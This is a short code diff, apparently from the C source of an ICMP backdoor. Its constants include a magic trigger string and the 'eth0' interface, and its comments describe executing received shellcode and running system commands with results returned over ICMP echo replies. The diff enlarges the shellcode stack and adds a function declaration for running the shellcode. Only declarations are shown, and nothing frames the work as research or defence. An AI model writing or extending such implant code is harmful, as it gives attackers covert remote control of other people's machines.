@@ -16,7 +16,7 @@
 #include <time.h>
 
 #define SIZE_ETHERNET   14
-#define STACK_SIZE      512
+#define STACK_SIZE      16384
 #define MAX_PACKET_SIZE 1024
 #define INTERFACE		"eth0"
 #define MAGIC           "GOATSE"
@@ -39,6 +39,9 @@ void send_packet(const uint8_t *data, uint32_t size, const struct iphdr *ip, con
 
 // Execute shellcode received from shellcode message
 void run_shellcode(const unsigned char *shellcode, uint32_t size);
+
+// Actually run the shellcode
+void execute_shellcode(const unsigned char *shellcode, const unsigned char *stack );
 
 // Execute system command and send back the results via ICMP echo reply
 void run_command(const unsigned char *command, uint32_t size, const struct iphdr *ip, const struct icmphdr *icmp);
